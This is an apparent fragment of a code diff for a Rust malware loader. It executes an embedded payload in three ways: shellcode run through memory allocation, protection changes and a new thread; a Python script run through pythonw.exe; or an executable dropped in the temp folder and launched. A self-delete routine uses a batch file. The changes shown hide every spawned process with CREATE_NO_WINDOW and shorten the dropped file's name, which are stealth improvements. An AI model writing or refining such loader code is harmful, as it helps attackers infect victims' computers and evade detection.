+                                    println!("Thread finished or wait returned");
+                                } else {
+                                    println!("Wait syscall address is 0");
+                                }
+                                CloseHandle(h_thread);
+                            } else {
+                                println!("CreateThread failed");
+                            }
+                        } else {
+                            println!("CreateThread address is 0");
                         }
+                    } else {
+                        println!("Protect failed");
                     }
+                } else {
+                    println!("Alloc failed or base is null");
+                }
+                if process_handle != 0 && process_handle != -1 {
+                    CloseHandle(process_handle);
                 }
             }
         }
         return;
     }
+
     if payload.starts_with(b"PY\0") {
         let mut p = 4usize;
         if p + 4 > payload.len() {
@@ -646,14 +732,21 @@ fn main() {
             return;
         }
         let script = String::from_utf8_lossy(&payload[p..p + len]).to_string();
-        let _ = Command::new("pythonw.exe").arg("-c").arg(script).spawn();
+        let _ = Command::new("pythonw.exe")
+            .arg("-c")
+            .arg(script)
+            .creation_flags(CREATE_NO_WINDOW)
+            .spawn();
         return;
     }
+
     if payload.starts_with(b"MZ") {
         let mut out_path: PathBuf = std::env::temp_dir();
-        out_path.push(format!("rs_pack_payload_{}.exe", std::process::id()));
+        out_path.push(format!("rs_p_{}.exe", std::process::id()));
         if fs::write(&out_path, &payload).is_ok() {
-            let _ = Command::new(&out_path).spawn();
+            let _ = Command::new(&out_path)
+                .creation_flags(CREATE_NO_WINDOW)
+                .spawn();
         }
     }
 }
@@ -667,6 +760,10 @@ fn self_delete() {
             exe_path.display()
         );
         let _ = fs::write(&bat, script);
-        let _ = Command::new("cmd.exe").arg("/C").arg(&bat).spawn();
+        let _ = Command::new("cmd.exe")
+            .arg("/C")
+            .arg(&bat)
+            .creation_flags(CREATE_NO_WINDOW)
+            .spawn();
     }
 }
